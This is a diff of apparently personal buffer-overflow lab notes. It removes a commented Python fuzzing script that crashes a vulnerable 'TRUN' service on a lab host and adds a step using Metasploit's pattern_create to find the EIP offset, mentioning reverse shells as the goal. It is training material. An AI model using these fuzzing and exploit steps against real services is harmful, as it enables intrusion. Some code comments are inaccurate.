@@ -157,105 +157,36 @@ print "A" * 5000
 
 - We already know that the program `Chat Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)
 
-- Fuzzing is very similar to spiking:
+- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking`.**
 
-    - We will try to send a bunch of characters at a specific command and try to break it... 
-    - The difference is that we already know which command is vulnerable (`write a message`) 
-
-- It's time to present...the python script for Fuzzing ahhhhhh (monk chant):
-
-    - Actually, I'm using the same scripts I used in `Vuln Server` lab!
-
-```python
-#!/usr/bin/python
-import sys, socket
-from time import sleep
-
-buffer = "A" * 100
-
-while True:
-        try:
-                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.connect(('192.168.1.100', 9999))
-                
-                s.send(('TRUN /.:/' + buffer))
-                s.close()
-                sleep(1)
-                buffer = buffer + "A"*100
-        
-        except:
-                print "Fuzzing crashed at %s bytes" % str(len(buffer))
-                sys.exit()
-```
-
-- You can call it something like: `1_brainstorm.py`
-
-    - **IMPORTANT: You need to chmod +x to make it executable** 
+    - **Instead, with just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169457936-a8693374-33ff-4aec-bb23-207f799a255d.png)
+- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**
+
+    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**
+
+    - Remember, controlling the `EIP` is the puprose of all of this attack. 
+
+---  
+
+### Finding the Offset
+
+- First of all, restart everything because the last crash...
+
+- We are going to be looking for where the overwirte the `EIP`: 
+
+    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
+    
+- **For this step, we will use the tool `pattern_create` by Metasploit:**
+
+- ![image](https://user-images.githubusercontent.com/94720207/169311872-83277c19-e042-4cab-8b48-197682ac4d15.png)
  
-- Now, I will comment it line by line:
-
-```python
-# We declare we are using python:
-#!/usr/bin/python
-
-# We import sys & socket modules, so we can pull specific IPv4 & Port
-# For example, for using "socket" & "connect" commands
-import sys, socket
-
-# We import from sleep module, only the "time" command
-# We will use it for wait 1 second "sleep(1)"
-from time import sleep
-
-# Declaring a "buffer" variable
-# Inside "buffer" variable, we have 100 A's (one hunded "A")
-buffer = "A" * 100
-
-# While True, we will loop and try something:
-while True:
-        try:
-                # Try to connect to this socket:
-                    # socket.AF_INET = IPv4
-                    # socket.SOCK_STREAM = PORT
-                    
-                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.connect(('192.168.1.100', 9999))
-                
-                # Once we've connected, we will send a "TRUN" command plus:  "s.send(('TRUN /.:/' + buffer))"
-                
-                    # We are using TRUN because we know is the vulnerable command in this case.
-                    # The registers /.:/ are the strings that the command needs to "understand" the command (those appear in the string of the Regs in Immunity Debugger)
-                    # + buffer: We are adding the buffer variable "A * 100", so...
-                        
-                        # WE ARE SENDING: TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-                        
-                    # Then, we are closing the connection with "s.close()"
-                    
-                    # Then, we sleep for 1 second the program with "sleep(1)"
-                    
-                    # Finally, we add to the variable "buffer" other A*100, so now, it will send 200...
-                    
-                    # The loop repeats: 100,200,300,400,500,600... the buffer will get bigger and bigger until the program breaks.
-        
-        # THE TRICK IS, WE ARE TRYING TO NARROW DOWN WHERE THE PROGRAM IS BREAKING AND WITH WHICH SPECIFIC BYTE SIZE.
-        # SO, WE GOING TO FUZZ IT:
-                                                        
-                s.send(('TRUN /.:/' + buffer))
-                s.close()
-                sleep(1)
-                buffer = buffer + "A"*100
-
-        # WHEN IT BREAKS, IT WILL PRINT AN EXCEPTION SHOWING EXACTLY WHERE IT CRASHED:
-        
-        except:
-                print "Fuzzing crashed at %s bytes" % str(len(buffer))
-                sys.exit()
-```
-
-- Now that 
-
-
+    - In Kali machine (-l is for lenght):
+    
+        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169460983-5457be7f-4a12-4f88-b31d-1d11a6a07153.png)
+ 
 
 
 
